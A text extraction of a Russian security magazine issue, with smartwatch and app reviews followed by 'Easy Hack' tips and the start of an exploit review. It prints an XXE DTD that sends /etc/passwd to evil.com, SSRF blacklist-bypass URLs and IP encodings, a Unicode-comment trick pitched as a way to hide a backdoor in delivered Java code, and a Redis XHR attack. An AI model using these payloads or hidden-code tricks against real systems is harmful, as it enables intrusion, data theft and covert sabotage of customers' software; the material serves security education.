 обещала  выложить  исходники),  да еще                                              Оранжевая батарейка (спасибо,
 и с поддержкой Linux. Зачем? Чтобы набрать   что не красный статусбар)
 базу разработчиков.

СВЕДЕНИЯ ДЛЯ ПЕРЕБЕЖЧИКОВ

 Вместе с анонсом iOS 9 Apple пообещала выпустить приложение для Android
 под названием Move to iOS. Смысл его в том, чтобы дать юзерам Android, ре-
шившим перейти на iOS, инструмент, который легко и непринужденно перене-
 сет все их данные на новый смартфон. По какому проводу или воздуху будет
 выполняться передача, Apple не сообщила, зато сказала, что можно перенести
 практически все:
 •  контакты;
 •  историю SMS;
 •  фото и видео;
 •  закладки;
 •  email-аккаунты;
 •  записи в календаре;
 •  обои;
 •  не защищенные авторским правом композиции и книги.



ВМЕСТО ВЫВОДОВ
В последнее время наблюдать за развитием Android и iOS — одно удовольствие.
 Этакая битва двух гладиаторов, один из которых использует меч и щит, а вто-
 рой — щит и меч. В этой статье я намеренно отошел от разного рода новых эле-
 ментов интерфейса и приложений и сосредоточился только на технической ча-
 сти, но даже на таком уровне видно, насколько идейно близкими становятся две
 операционки. Да-да, я не собираюсь разжигать кровной вражды между двумя
 лагерями, я, наоборот, хочу сказать, что мы уже и так ходим в гости к соседям,
 а скоро так вообще будем жить в одной квартире. Скучно стало, господа.
X-Mobile

Колонка Евгения Зобнина




                                                Евгений Зобнин
                                                                      androidstreet.netЧасы
с кукушкой


Уже два года в моем арсенале гаджетов присутствуют ум-
ные часы Omate Truesmart. Это отличный девайс, приме-
чательный наличием 3G-модуля и полноценным Android на
борту, а потому их можно использовать как самостоятель-
ный девайс, не требующий наличия смартфона. Однако, ког-
да связь со смартфоном все-таки понадобилась, я получил
серьезные проблемы. Дело в том, что Omate не стала напря-
гать себя созданием приложения-компаньона и решение
пришлось изобретать самостоятельно. Думаю, мой подход
заинтересует других владельцев TrueSmart или любых дру-
гих подобных часов, которых на рынке предостаточно (осо-
бенно на китайском).





УВЕДОМЛЯТОР
На самом деле я немного слукавил. Еще с февраля 2014 года для данного
типа часов в маркете доступно приложение SWapp Link. Возможностей у него
огромное количество, начиная от показа уведомлений и заканчивая управ-
лением медиапроигрывателем и настройками смартфона. Причем не только
по Bluetooth, но и через выделенный сервер и даже по СМС.
  Проблема SWapp Link только в том, что это крайне нестабильное и очень
сырое приложение. Оно медлительно, часто падает, выдает крайне высокие
задержки перед показом уведомления, а в случае потери связи со смартфо-
ном (или, наоборот, с часами) выжирает батарею за пару часов. Все это созда-
ет огромные неудобства и нивелирует все преимущества умных часов.
  Выход я нашел в том, чтобы заменить SWapp Link на, так сказать, кустарное
решение на базе приложений, изначально не предназначенных для работы
на умных часах. Это приложения NotiSync и Heads-Up notifications (оба не толь-
ко бесплатные, но и открытые). Первое позволяет пересылать уведомления
приложений на другое устройство по Bluetooth, второе показывает уведомле-
ния поверх экрана в стиле Android 5.0 (с возможностью показа на экране бло-
кировки с автоматическим включением экрана).
   Работая вместе, они позволяют организовать моментальное отображение
уведомлений на часах. Такая связка работает гораздо стабильнее и быстрее
SWapp Link, не садит батарею и не имеет проблем с задержками. А в качестве
приятного бонуса я получил возможность привязать к часам множество раз-
ных устройств: смартфон, планшет и даже телевизионную приставку на базе
Android.
   Настройка крайне проста. Устанавливаем оба приложения на оба девайса,
затем ставим NotiSync на часы. Соединяем устройства по Bluetooth, запуска-
ем на обоих NotiSync и переводим верхний переключатель в положение ON.
Далее запускаем на часах Heads-Up, заходим в настройки и ставим галочки
напротив следующих пунктов:
•  разблокировать телефон при открытии уведомления;
•  тема — Android L Темная (лучше выглядит поверх циферблата);
•  положение уведомления — по центру (по умолчанию — сверху);
•  размер шрифта — 150%;
•  показывать на экране блокировки;
•  включать экран;
•  снимаем галочку с опции «Компактный режим».

Это все. Теперь при звонке, СМС или сообщении Hangouts экран часов будет
включен и на нем появится уведомление вместе с самим сообщением. Что-
бы иметь возможность получать уведомления от других приложений, каждое
из них придется добавить отдельно в NotiSync. Для этого открываем NotiSync
на смартфоне, переходим на вкладку Custom и нажимаем кнопку +. В поле App
выбираем нужное приложение, затем даем ему название в поле Name, после
чего поле Tag заполнится автоматически. Нажимаем галочку вверху экрана.
  Перед добавлением нового приложения NotiSync предложит синхронизи-
ровать настройки с часами. Обязательно соглашаемся, это позволит открыть
настройки приложения (профиль) на часах и указать различные опции. Напри-
мер, выбрать уникальный звук уведомления, включить/выключить вибрацию,
настроить показ уведомления только при отсутствии интернета, что очень
полезно в тех случаях, когда часы используются не только как компаньон,
но и как обособленный девайс с сим-картой.

ДРУГИЕ ФУНКЦИИ
Еще одно преимущество SWapp Link — это показ погоды прямо на цифер-
блате часов (функция появилась в бета-версии). Погода синхронизируется
по Bluetooth со смартфоном, а потому не требует подключения к интернету.
К сожалению, я не придумал, как реализовать такую функциональность с по-
мощью других приложений, но нашел обходной путь.
  В маркете есть приложение Weather Notification (опять же бесплатное и от-
крытое). Оно показывает погоду в виде приоритетного уведомления, которое
нельзя «смахнуть». Каждый час уведомление обновляется с новой сводкой по-
годы. Все, что требовалось сделать, — это установить его и добавить NotiSync.
После этого часы начали показывать на экране текущую погоду. В некотором
смысле это даже удобнее, чем функциональность Swapp Link.
   Также в Swapp Link есть противоугонка. Довольно полезная, но почему-то
нерабочая функция, которая позволяет блокировать смартфон в том случае,
если часы исчезли из поля видимости (недоступны по Bluetooth). Аналогичная
функция есть и в Android 5.0 (Настройки -> Безопасность -> Smart Lock). Но ни-
чего подобного нет в более ранних версиях Android. К счастью, это можно ис-
править с помощью Tasker, приложения Secure Settings и root.
   Кстати, в качестве циферблата часов очень удобно использовать приложе-
ние Timeicon (отключив при этом сам экран блокировки). Он позволяет вклю-
чать/отключать функции часов, такие как Wi-Fi или режим полета, прямо с ци-
ферблата. Да и выглядит он приятно.

ВЫВОДЫ
Вообще, Heads-Up — это в любом случае must have на часах с 3G-модулем,
даже если функция компаньона не нужна вовсе. Раньше мне приходилось са-
мостоятельно включать часы при получении уведомления и «смахивать» ци-
ферблат, чтобы увидеть уведомление. Теперь они включаются сами и сразу вы-
водят текст уведомления, как и должны работать нормальные умные часы.
X-Mobile
КАРМАННЫЙ
СОФТ
                  В этом выпуске: все дляВЫПУСК #9.
                          Android Wear. А именно:
SMARTWATCH                       управляем настройками
EDITION             смартфона прямо с часов,
                       устанавливаем сторонний
                        лаунчер приложений,
                       закрепляем приложение
                       на экране вместо
                      циферблата и заставляем    Евгений Зобнин
      androidstreet.net                делать часы все, что
                         только взбредет нам
                        в голову. Как обычно —
                        приятного чтения.





                                         Toggles Wear

                                   Платформа:
                                              Android Wear

                                     Цена: 49,05 р.





TOGGLES WEAR
В отличие от Apple Watch, часы на базе Android Wear могут делать очень мно-
гое, включая запуск полноценных Android-приложений. И Toggles Wear — один
из удачных примеров всех этих возможностей. Это своего рода пульт управле-
ния смартфоном, позволяющий настроить активацию/деактивацию Wi-Fi, пе-
редачу мобильных данных, пробуждение/засыпание устройства, включение
фонарика, поиск смартфона и многое другое.
   Доступны два режима работы: классическое приложение для часов и выез-
жающая при касании правой части экрана панель. В обоих случаях ты увидишь
синий экран с кнопками, а также информацию о заряде батареи. И да, Toggles
Wear умеет уведомлять о низком уровне заряда батареи и окончании зарядки
смартфона. За все это придется выложить 50 рублей, но триального периода
в Google Play более чем достаточно, чтобы оценить приложение.





               Wear Mini Launcher

               Платформа:
                    Android Wear

                Цена: бесплатно

WEAR MINI LAUNCHER
В Android Wear не слишком удачная (за что ее часто критикуют) система запуска
приложений: тапнуть по экрану, промотать до конца списка, тапнуть по пункту
«Start...», промотать длинный список в поисках нужной софтины, да еще и не-
обходимо помнить ее название. Этот и без того неудобный способ кажется
совсем архаичным после взгляда на Apple Watch с его пузырями. К счастью,
Wear Mini Launcher легко решает эту проблему с помощью традиционной сет-
ки приложений, доступной по свайпу. На скриншоте хорошо видно, как это вы-
глядит в действии.
  В качестве бонуса ты получишь панель быстрых настроек (двойной свайп)
с отображением уровня заряда часов и смартфона. Да, примерно такую же,
как в Toggles Wear, но с настройками самих часов, а не смартфона. И самое
приятное, что за все это не придется платить ни копейки. Ну или ни одного
цента, кому как больше нравится.





                                   KeepApp Wear

                                   Платформа:
                                              Android Wear

                                     Цена: 64,56 р.


KEEPAPP WEAR: APP COME BACK
Часы, какими бы умными они ни были, остаются в первую очередь часами,
и Google это прекрасно понимает. Поэтому после включения экрана Android
Wear показывает циферблат, а не последнее запущенное приложение. Это пра-
вильное и удобное решение, но нередко оно просто мешает. Представь, что ты
пришел в магазин и, осматривая полки с продуктами, сверяешься со списком
покупок. Тебе придется постоянно тапать по экрану и вновь запускать Google
Keep. KeepApp Wear позволяет обойти эту проблему, закрепив на экране вы-
бранное приложение.
   Запусти KeepApp, выбери нужное приложение, и оно будет оставаться
на экране, а все, что потребуется от тебя, — просто поднять руку. Чтобы вер-
нуть циферблат на законное место, достаточно выйти из приложения, подо-
ждать полторы секунды, чтобы KeepApp успел зарегистрировать закрытие,
а затем отключить экран.





                                      AutoWear

                                   Платформа:
                                              Android Wear

                                     Цена: бесплатно

AUTOWEAR
А вот это уже просто must have для всех, кто знает, что такое Tasker, и актив-
но использует его. AutoWear — это плагин для Tasker, позволяющий связать
последний с часами и таким образом полностью или частично их автомати-
зировать. Хочешь, чтобы по голосовой команде с часов смартфон включался,
активировал GPS и запускал навигационное приложение? Нет ничего проще!
Хочешь повесить на свайпы часов собственные действия? Легко! Хочешь пре-
вратить часы в пульт управления чем угодно? Без проблем!
   AutoWear позволяет не просто оснастить часы новыми возможностями,
а сделать почти все, что только придет тебе в голову. В комбинации с другими
плагинами того же разработчика (http://joaoapps.com/autowear/) AutoWear пре-
вращает часы в универсальный пульт. И это, кстати, хорошо видно на видеоро-
лике на странице Android Wear в Google. Он действительно впечатляет.
Взлом





Алексей «GreenDog» Тюрин, Digital Security
agrrrdog@gmail.com,,twitter.com/antyurin
EASY





                WARNINGHACKВся информация предоставлена исключительно в ознакомительных целях.
                               Лица, использующие данную информацию в противозаконных целях, могут
                              быть привлечены к ответственности.


ЗАДАЧА: СОБРАТЬ ИНФОРМАЦИЮ О ХОСТЕ,
ИСПОЛЬЗУЯ TCP TIMESTAMP

Один подзабытый, но до сих пор юзабельный метод удаленного сбора инфор-
мации о хосте на основе анализа TCP/IP был как-то упущен и не попал в Easy
Hack. Сейчас мы это поправим.
   Основан метод, как ясно из названия, на специальной фиче протокола TCP,
которая называется timestamp. В заголовках пакетов TCP есть дополнительное
поле, оно состоит из четырех частей, две из которых чисто технические, а две
используются для хранения timestamp’ов. Каждый из них — это некое число,
означающее время в тиках. С помощью TCP timestamp клиент и сервер могут
обмениваться данными о системном «времени».
   Хоть timestamp по умолчанию и не добавляется в заголовок TCP, но если
клиент добавит его в пакет, то это сделает и сервер. Эта фича поддерживается
почти всеми ОС и используется для двух механизмов: RTTM (Round Trip Time
Measurement) и PAWS (Protect Against Wrapped Sequences). Суть их для нас не-
важна, главное — что отключение поддержки TCP timestamp не предвидится.





Пример TCP timestamp от сервера

Но самое важное для нас — это то, как происходит формирование TCP timestamp.
Timestamp — это не какое-то случайное значение, оно привязано к реальному
времени хоста. После перезагрузки хоста значение timestamp чаще всего сбра-
сывается, но затем оно линейно увеличивается (как именно — зависит от ОС).
Где-то каждый тик равен одной миллисекунде, где-то — 0,1.
   Что это может нам дать? Несколько вещей.
   Во-первых, мы можем узнать время запуска хоста. Для этого нам надо сде-
лать два запроса к серверу через определенный промежуток времени (напри-
мер, в секунду) и получить изменение timestamp. На основе этого изменения
мы можем прикинуть число тиков в секунду. И дальше перевести общее коли-
чество тиков сначала в секунды, а затем в дату.
   Иногда точность определения времени очень высока. С другой стороны,
полного доверия нет, так как если хост работает долго (и тики «короткие»), то
timestamp дойдет до максимального значения и снова начнет с нуля.
   Зная время запуска системы, можно определить, какие в ней установлены
патчи (если патч очень свежий и для него нужна перезагрузка ОС), или, к при-
меру, различить клиентские хосты и серверы, так как первые в корпоративных
сетях чаще всего выключаются на ночь.
   Куда более интересная вещь — это раскрытие информации о сетевой кон-
фигурации. Представь, что есть IP-адрес и на нем доступны несколько серви-
сов (например, 21, 22, 80). Но на самом деле это файрвол, который пробрасы-
вает порты на какие-то внутренние хосты (например, 21 и 22 на 192.168.0.10,
а 80 — на 192.168.0.20). Изучая timestamp, мы можем узнать, какие из портов
относятся к одному хосту, а какие — к другому (конечно, с некой долей веро-
ятности). Основная идея тут заключается в том, что timestamp един для всех
сервисов в ОС, но шанс того, что на двух хостах будут одинаковые «штампы»,
минимальны.
   Таким образом, мы подключаемся к каждому из портов, получаем по каждо-
му из них timestamp и группируем. Аналогично можно найти присутствие ба-
лансировщика нагрузки. Когда мы делаем несколько запросов на один и тот же
порт, но получаем «штампы» со значением, изменившимся нелинейно, то по-
нимаем, что нагрузка балансируется и наши запросы обрабатываются на раз-
личных хостах.
   Теперь о практике. Получить значение timestamp от сервера можно, просто
добавив соответствующий заголовок в TCP. Вот пример для hping3:

hping3 -c 4 -S -p any_port --tcp-timestamp ip.ad.dre.ss

Но для подсчета uptime можно использовать и Nmap. Параметр –O (определе-
ние версии ОС) с параметром –d (показывать debug) выводит эту информацию.
   Для детекта и группирования хостов за NAT можно воспользоваться скрипти-
ком, который анализирует результаты Nmap.





Пример определения uptime с помощью Nmap


ЗАДАЧА: ВНЕДРИТЬ «ЗАКЛАДКУ»
В ПРИЛОЖЕНИЕ НА JAVA

Сначала немного поясню саму задачу. Представим, что мы разработчики со-
фта и хотим добавить бэкдор в какую-то нашу программу, написанную на Java,
чтобы получать в нее доступ после передачи заказчику. Понятное дело, разных
способов много, мы рассмотрим один из них — четко попадающий под назва-
ние этой рубрики.
   Недавно я наткнулся на забавный вопрос на Stack Overflow. Оказывается,
если в комментариях Java-программы добавить последовательность Unicode
для переноса строки и после нее написать свой код, то IDE будет отображать
это как комментарий, хотя в итоге наш код будет выполнен. Это хорошо видно
на примере.

// \u000a System.out.println("Hello World!");

   Как ты понимаешь, \u000a — это эскейп-последовательность для юникод-
ного символа переноса строки (он же \n).
   Как это возможно? Причина проста. Сначала производится декодирование,
а потом уже разбор самого кода. В итоге все равно, комментарий это, коман-
ды языка или параметры. Таким образом, часть команд можно закодировать
в этом формате. Следующий пример тоже рабочий.

// \u000a\u0020System\u002eout.\u0070rintln("Hello World!"\u0029;

   Важно, что это фишка с определенными «корнями» (подробнее по ссылке
выше), так что исправление не предвидится.





Пример заенкоженной программы «Hello, world»


ЗАДАЧА: ОБОЙТИ ЧЕРНЫЙ СПИСОК,
ЗАЩИЩАЮЩИЙ ОТ SSRF

Давай представим себе типичную ситуацию: есть веб-приложение, которое
должно уметь брать какой-то контент с других серверов, но, что самое опас-
ное, путь до контента задается пользователем. Атакующий имеет потенциал
для проведения SSRF-атак. Даже если предположить, что мы можем использо-
вать только протоколы HTTP и HTTPS, открывается немалый простор для дей-
ствий: от простейших (можно узнать IP хостов во внутренней сети и открытые
порты на них) до хитрых махинаций, которые в определенных ситуациях могут
приводить к RCE.
   Казалось бы, простейшее решение — вынести веб-приложение в специ-
альную DMZ или, наоборот, полностью перенести в интернет. Во втором случае
атакующий может попытаться проводить SSRF, но к внутренним ресурсам до-
ступа не получит. Но, во-первых, современные веб-приложения обычно явля-
ют собой многокомпонентную систему (хотя бы веб-сервер и СУБД) с распре-
делением нагрузки (серверов больше, чем один) и системами мониторинга.
Все это расширяет простор для атаки. Во-вторых, есть различные локальные
сервисы, которые висят на loopback-интерфейсе (а-ля 127.0.0.1), который ча-
сто рассматривается как «доверенный» (к нему же можно подключиться только
с того же хоста).
   Разработчики в итоге приходят к выводу, что давать доступ нужно ко всему,
кроме определенного набора мест. Классический способ реализации — это
черные списки. Создается набор регулярных выражений, по которому и прове-
ряют полученный от пользователя URL перед инициализацией запроса. Наше
же дело — попытаться обойти эти блек-листы. Вот несколько вариантов путей
обхода.

1. Обход регекспа. Составить правильное регулярное выражение, если воз-
   можностей много, — не самая простая задача. Чтобы обойти черный спи-
   сок, нужно для начала вспомнить, как составляется URL. Вот общая схема.

   scheme://[user:password@]domain:port/path?query_string#fragment_id

  Самое важное то, что перед именем хоста мы можем указать через двоето-
   чие логин и пароль, а далее поставить «собаку». В этом случае мы говорим,
   что хотим аутентифицироваться на ресурсе. Это не какая-то хитрая фича,
   а изначальная задумка, и поддерживается она в том или ином виде везде.
     Возьмем адрес safecurl.fin1te.net. Вот примеры того, как его можно спря-
   тать в URL.

   http://validurl.com#user:pass@safecurl.fin1te.net

   Парсер увидит validurl.com и даст добро, но тот же curl посчитает креда-
  ми все, что идет до @. Если точнее, то validurl.com#user — это имя поль-
   зователя. Вот еще один пример.

   http://user:pass@safecurl.fin1te.net?@google.com/

   Парсер клюнет на последнее значение, а curl использует центральное
   (safecurl.fin1te.net), так как все перед первой «собакой» считается кре-
   дами, но то, что после знака вопроса, — уже часть query_string. На отсут-
   ствие закрывающего слеша curl внимания не обратит.
2. Постатака. Мы можем предоставлять корректный URL, но тем или иным
   способом менять точку для конечного подключения. Например, можно ука-
   зать корректное доменное имя нашего сайта, но резолвиться имя будет
   в 127.0.0.1 или другой IP-адрес внутренней сети. И так как реально под-
   ключение идет по IP, мы обходим черный список. Еще можно использовать
   редиректы. Указываем имя своего хоста, а на нем ставим редирект на дру-
   гой хост, который мы хотим атаковать.
3. Удар в незащищенное место. На самом деле специальных адресов, по-
  мимо 127.0.0.1, множество. Весь диапазон 127.0.0.1/8 принадлежит ин-
   терфейсу loopback. К примеру, 127.123.45.67 — это тоже он, и все сервисы
   loopback тут тоже доступны.
      Есть еще специальный локальный адрес — 0.0.0.0, а также адрес IPv6 —
   ::1. Добавим сюда мультикаст-адреса, через которые можно общаться
   с некоторыми системами из окружения (примеры смотри в презентации
   по ссылке ниже). Еще можно использовать доменное имя localhost или, если
   хост состоит в домене, варьировать короткое или длинное имя хоста.
4. Игра с кодировкой. IP-адрес или имя хоста можно попробовать закодиро-
   вать. Черный список будет обойден, а адрес автоматически преобразуется
   в классический вид перед подключением. Интересно, что эта тема была об-
   наружена еще в 2000 году. И вот через пятнадцать лет она опять актуальна.

Итак, мы все знаем про классическое десятеричное представление IP-а-
дресов. Но оказывается, что есть и другие варианты. Причем варианты
эти зависят от ОС, языка программирования и прочего. Несмотря на свою
странность, работают они до сих пор (я проверял на Java и Python в Ubuntu
и Windows). Для эксперимента возьмем IP-адрес 188.226.235.38.

1. Для начала мы можем избавиться от точек между октетами
   (частями) IP-адреса. Для этого нам нужно последовательно умножать
   каждое значение из октетов на 256 и суммировать с последующим.

   188 * 256 = 48 128
   48 128 + 226 = 48 354
   48 354 * 256 = 12 378 624
   12 378 624 + 235 = 12 378 859
   12 378 859 * 256 = 3 168 987 904
   3 168 987 904 + 38 = 3 168 987 942

   3 168 987 942 — это то же самое, что и 188.226.235.38, только без точек.
   Называется такое представление IP-адреса Dword или Dotless.
2. Мы можем использовать шестнадцатеричные значения вместо де-
   сятичных. Для этого используем приставку «0x».

   188 —> 0xbc
   226 —> 0xe2
   235 —> 0xeb
   38 —> 0x26

   Итого: 188.226.235.38 —> 0xbc.0xe2.0xeb.0x26. Кроме того, можно снова
убрать точки и получить другое представление IP-адреса: 0xbce2eb26.
3. Использовать восьмеричное значение (octal IP). Тогда нужно добав-
   лять 0 в начало.

   188 —> 0274
   226 —> 0342
   235 —> 0353
   38 —> 0046

   Получается 188.226.235.38 —> 0274.0342.0353.0046.
   Тут тоже есть трюк — можно добавлять произвольное количество нулей в на-
чало. То есть IP-адрес 0000274.00000342.00353.000000046 такой же рабочий.
4. Также можно «перегружать» значения в IP-адресе. Если проще, то мы
  можем ставить значения более 255 (в десятичной системе). Значения более
   255 будут уже больше одного байта, но лишние байты (слева) отсекаются.

   188 — это 10111100, а 188 + 255 = 443, то есть 0000001 10111011.

  При декодировании IP-адреса левый байт будет отброшен и опять останет-
   ся только 188. На самом деле мы можем еще и еще добавлять 255 (правда,
   трех символов в октете уже быть не может). Добавляем в любой октет или во
   все сразу.
     Аналогичный способ должен работать и для шестнадцатеричных значе-
   ний. В теории к 0xbce2eb26 мы можем добавить любое значение слева. На-
   пример, числа 0x9A3F0800bce2eb26 и 9A3F0800 будут урезаны по тому же
   принципу. Но у меня данный метод нигде не заработал.
5. Все перечисленное можно смешивать в любой последовательности,
   а точки можно убирать частично. Например, 444.226.0000353.0x26 —
   это перегруженное десятичное, десятичное, восьмеричное и шестнадцате-
   ричное значения. И это тоже IP-адрес.

Вариаций очень много, но не рассчитывай на уж очень изощренные варианты.
Как я писал выше, есть зависимость от языка и от ОС — разные методы под-
держиваются или не поддерживаются в разных местах.
   Как видишь, методов для обхода достаточно, но многое зависит от конкрет-
ной ситуации у жертвы и личной удачи. Большая часть примеров взята из пре-
зентации Server-side Browsing considered harmful Николаса Грегори c AppSec
2015 и проекта SafeCurl.


ЗАДАЧА: ПРОВЕРИТЬ САЙТ НА ДВИЖКЕ DRUPAL

Drupal — одна из самых известных и популярных открытых CMS на PHP. Ей поль-
зуются и крупные компании, и даже госструктуры (например, на ней работает
whiteHouse.gov). Уметь проверять на прочность такие CMS — дело важное.
  Сама CMS построена на правильном подходе и с оглядкой на гайдлайны
по безопасности. Так что найти баги в ядре системы будет непросто. Хотя вся-
кое бывает, и в прошлом году там вроде бы нашли SQL-инъекцию.
   Как и в случае с другими CMS, основная часть уязвимостей вылезает из раз-
личных плагинов, тем и других кастомных функций. Удобнее всего иметь тулзу,
которая показывает версии Drupal и его компонентов. Зная их, можно искать
известные уязвимости.
   Здесь, конечно, уже постарались — есть вполне живой проект droopescan.
Он работает быстро, просто, имеет все нужные функции и написан на Python.


ЗАДАЧА: СЛИТЬ ДАННЫЕ ЧЕРЕЗ XXE

Вот еще один мини-трюк, который позволяет получить данные из файла через
XXE. Он был недавно упомянут в блоге NetSPI, еще не до конца протестирован,
но может оказаться полезным.
   Как ты знаешь, есть три основных метода получения данных через XXE:
•  через запрос;
•  через ошибку;
•  через внешний ресурс (XXE OOB).

   Последний метод работает так. На своем ресурсе мы размещаем специаль-
ный файл DTD c несколькими сущностями и потом ссылаемся на него из фай-
ла XML, который отправляем жертве. Одна из сущностей должна указывать
на файл, который мы хотим увести, а вторая (и третья) используется для соз-
дания новой сущности, указывающей на наш хост (вместе с контентом файла).
Подробнее про саму технику читай в докладе Тимура Юнусова и Алексея Оси-
пова.
  Пример DTD:

<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % param1 '<!ENTITY % external SYSTEM
 "http://evil.com/%payload;">'> %param1; %external;

Если по каким-то причинам на последнем этапе данные файла (%payload;)
на хост evil.com не передаются, то можно попытаться вызвать ошибку парсера
и прочитать содержимое файла через ошибку от сервера.
   Все, что требуется, — это указать некорректный хост. Напишем, к примеру,
lalala:

<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % param1 '<!ENTITY % external SYSTEM "file:///lalala/%pay-
load;">'> %param1; %external;

Хотелось бы подчеркнуть, что поведение парсеров вроде бы известно и изуче-
но, но сюрпризы на практике часто встречаются.


ЗАДАЧА: ПОЛУЧИТЬ ДОСТУП В ДРУГОЙ VLAN

Несанкционированный доступ к VLAN — важная и широко распространенная
технология, так что она представляет для нас большой интерес. Тема эта боль-
шая, и в этот раз я лишь объясню ее концепцию.
   Для начала вспомним, как хосты находят друг друга в сети. Есть хост PC0 с ка-
ким-то IP (192.168.1.1) и каким-то MAC, а также хост PC1 со своим IP (192.168.1.2)
и MAC. Они соединены через свитч (см. правую часть скриншота). Когда хост
PC0 захочет отправить что-то на PC1 (он знает только IP хоста PC1), он отпра-
вит широковещательный ARP-запрос: свой MAC в адресе отправителя и широ-
ковещательный FF:FF:FF:FF:FF:FF в строке получателя. Свитч, получив запрос,
перешлет его на все свои порты. Далее запрос придет на PC1, на что тот отве-
тит ARP со своим MAC. Таким образом, PC0 получит ответ c MAC-адресом PC1
и сможет далее отправить нормальный пакет.

Тестовый стенд с двумя VLAN’ами
                     5





                      10

Здесь мы видим некий сетевой сегмент (он же LAN, Local Area Network), вся
маршрутизация данных происходит за счет Layer 2 при помощи свитчей (без
IP-маршрутизации).
  VLAN (Virtual LAN, виртуальная локальная сеть) — это такие же LAN, но они
не привязаны к физическому оборудованию. То есть хосты PC0 и PC1 могут быть
воткнуты в один свитч, но не быть в одном сегменте, так как будут находиться
в разных виртуальных сетях. Это позволяет делить сеть независимо от того, ка-
кая машина воткнута в какой свитч.
   Теперь взглянем на скриншот целиком. Без VLAN все хосты, подключенные
к свитчам, могут общаться между собой, но с виртуальными сетями мы можем
сгруппировать, например, PC1 и PC3 во VLAN 5, а PC2 и PC0 в VLAN 10.
   «Физическая» суть виртуальных сетей очень проста. В Ethernet-кадр добав-
ляется дополнительное поле, указывающее на принадлежность к VLAN (цифро-
вой идентификатор). Описывается это стандартом 802.1Q.


     Ethernet-кадр с дополнительным заголовком — VLAN





  В самом классическом виде администратору необходимо указать, какой се-
тевой порт свитча к какой виртуальной сети относится. Эти порты называются
access. И когда на порт приходят данные от конечного хоста, они помечаются
идентификатором, который соответствует VLAN.
  Самое главное, что пакеты, помеченные определенной виртуальной сетью,
переправляются только на порты с таким же VLAN. Вернувшись к первому при-
меру, мы видим следующее. Хост PC0 может отправить запрос на PC1, но свитч
пометит кадр от PC0 десятым VLAN и не перешлет его на сетевой порт с PC1, так
как последний находится в VLAN 5.
   Переиначив, можно сказать, что с применением виртуальных сетей мы мо-
жем группировать сетевые порты свитчей в отдельные сетевые сегменты.
  Но что делать с центральным линком между свитчами? Ведь если мы хотим
сгруппировать PC1 и PC3 в VLAN 5, а PC2 и PC0 в VLAN 10, то между свитчами 0
и 1 должны ходить данные. И для этого есть такое понятие, как trunk-порт. Ад-
министратор должен указать на обоих свитчах, что порты их соединения тран-
ковые и там ходит тегированный трафик (с указанием виртуальной сети).
   Таким образом, все это сводится к такой последовательности. Когда конеч-
ный хост отправляет какие-то данные, свитч смотрит, к какой виртуальной сети
относится конкретный порт, на который пришли данные, и пересылает их только
на порты с тем же VLAN. Если есть trunk-порт с разрешением пересылки из дан-
ного VLAN, то свитч добавляет тег и отправляет кадр в trunk-порт. При этом вто-
рой свитч поступает так же. Полученный кадр он пересылает только на порты
с той же виртуальной сетью.
   Стоит отметить и то, что свитч всегда удаляет тег при отправке кадра
на access-порт. Поэтому для конечных узлов тегировка пакетов скрыта. Кро-
ме того, если на access-порт от конечного узла придет тегированный кадр (c
VLAN), то он, скорее всего, будет отброшен свитчем.
  Еще важно отметить, что нетегированный трафик по умолчанию считается
относящимся к native VLAN (значение равно единице).
   Для связи разных виртуальных сетей между собой мы должны добавлять
маршрутизацию на уровне IP (Layer 3). Обычно маршрутизатор втыкается
в транк-порт и, получая тегированный трафик, маршрутизирует и переставляет
теги.
   Сведя воедино сказанное выше, можно заметить, что даже если мы сидим
с жертвой в одном офисе и подключены к одному свитчу, не факт, что мы смо-
жем атаковать ее, если находимся с ней в разных виртуальных сетях.
  Но не стоит опускать руки — виртуальные сети часто дают лишь иллюзию
безопасности, и, используя различные трюки, мы можем добиться очень мно-
гого. О них — в другой раз!
Взлом





                                                                           Борис «dukeBarman
                                                                                        Рютин»,
                                                                                   Цифровое оружие
                                                                                           и защита
                                                                                                              b.ryutin@zorsecurity.ru,
                                                                                         @dukebarman,
                                                                                                 dukebarman.pro

     WARNING

       Вся информация
     предоставлена исклю-
       чительно в ознако-
       мительных целях.
    Ни редакция, ни автор
     не несут ответственно-
      сти за любой возмож-
    ный вред, причиненный
     материалами данной
             статьи.

ОБЗОР
ЭКСПЛОЙТОВ
 АНАЛИЗ СВЕЖЕНЬКИХ УЯЗВИМОСТЕЙ





  Наш сегодняшний обзор будет посвящен уязвимостям, которые
     позволяют совершить побег из разнообразных песочниц.
   Одна из них затронула такую популярную виртуальную машину,
 как QEMU. В ходе ее эксплуатации можно выполнить произвольный
    код, который затронет хостовую машину. Другая же основана
      на встраиваемом языке Lua — она позволяет не просто
               выполнять код, но и читать память.

ВЫПОЛНЕНИЕ КОДА В REDIS ЧЕРЕЗ EVAL

 CVSSv2:       N/A
 Дата релиза:  4 июня 2015 года
 Автор:        Ben Murphy
 CVE:           2015-4335

Уязвимость в нереляционной высокопроизводительной базе данных Redis по-
зволяет выйти из Lua-песочницы и выполнить произвольный код. Сама уяз-
вимость не нова и основана на работе Питера Коли с байт-кодом Lua — type
confusion.
  Особой угрозы в этой уязвимости нет, так как в соответствии с моделью
безопасности Redis только доверенные пользователи могут подключаться к
БД. Поэтому основные цели атак — это системы разработчиков, добраться до
них можно с помощью SSRF-атак или благодаря облакам.
  Машины разработчиков, использующих Redis, могут быть уязвимы из-за
того, что Redis биндится на все интерфейсы, которые в свою очередь ждут по-
лучения инструкций. Такое поведение прописано в настройках по умолчанию.
   Также разработчики могут быть уязвимы, если есть биндинг на 127.0.0.1.
Один из примеров атаки на Redis через HTTP расписан исследователем Нико-
ласом Грегори. В его отчете рассказано об атаке на сервер Facebook, работа-
ющий на Redis, через уязвимость SSRF.
   Так как Redis — это HTTP-сервер, у него есть схожие политики безопасно-
сти для браузеров, которые могут позволить любому сайту отправить к нему
запрос POST. Для получения полного контроля нам нужно использовать XHR.
Для примера напишем в консоли браузера при запущенном Wireshark такие
команды:

var x = new XMLHttpRequest();
x.open("POST", "http://127.0.0.1:6379");
x.send('eval "print(\\"hello\\")" 0\r\n');

В Wireshark мы увидим следующее:

POST / HTTP/1.1
Host: 127.0.0.1:6379
Connection: keep-alive
Content-Length: 27
Pragma: no-cache
Cache-Control: no-cache
Origin: http://www.agarri.fr
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) Apple
WeKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
